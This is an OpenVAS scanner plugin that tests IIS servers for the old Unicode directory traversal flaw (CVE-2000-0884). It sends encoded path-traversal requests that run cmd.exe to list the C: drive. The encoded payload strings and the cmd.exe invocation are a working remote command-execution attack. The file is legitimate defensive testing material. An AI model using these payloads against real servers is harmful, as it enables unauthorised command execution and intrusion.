# OpenVAS Vulnerability Test
# Description: IIS directory traversal
#
# Authors:
# First written Renaud Deraison then
# completely re-written by HD Moore
#
# Copyright:
# Copyright (C) 2001 H D Moore
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10537");
  script_version("2019-05-15T08:01:39+0000");
  script_tag(name:"last_modification", value:"2019-05-15 08:01:39 +0000 (Wed, 15 May 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1806);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2000-0884");
  script_name("IIS directory traversal");
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2001 H D Moore");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("IIS/banner");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/bulletin/ms00-078.mspx");

  script_tag(name:"solution", value:"The vendor has releases updates. Please see the references for more information.");

  script_tag(name:"summary", value:"The remote IIS server allows anyone to execute arbitrary commands
  by adding a unicode representation for the slash character in the requested path.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
banner = get_http_banner(port:port);
if(!banner || "IIS" >!< banner )
  exit(0);

dir[0] = "/scripts/";
dir[1] = "/msadc/";
dir[2] = "/iisadmpwd/";
dir[3] = "/_vti_bin/"; # FP
dir[4] = "/_mem_bin/"; # FP
dir[5] = "/exchange/"; # OWA
dir[6] = "/pbserver/"; # Win2K
dir[7] = "/rpc/"; # Win2K
dir[8] = "/cgi-bin/";
dir[9] = "/";

uni[0] = "%c0%af";
uni[1] = "%c0%9v";
uni[2] = "%c1%c1";
uni[3] = "%c0%qf";
uni[4] = "%c1%8s";
uni[5] = "%c1%9c";
uni[6] = "%c1%pc";
uni[7] = "%c1%1c";
uni[8] = "%c0%2f";
uni[9] = "%e0%80%af";

cmd = "/winnt/system32/cmd.exe?/c+dir+c:\\+/OG";
for(d = 0; dir[d]; d++) {
  for(u = 0; uni[u]; u++) {
    url = string(dir[d], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", uni[u], "..", cmd);
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);
    if(!res)
      continue;

    if(("<DIR>" >< res) || ("Directory of C" >< res)) {
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);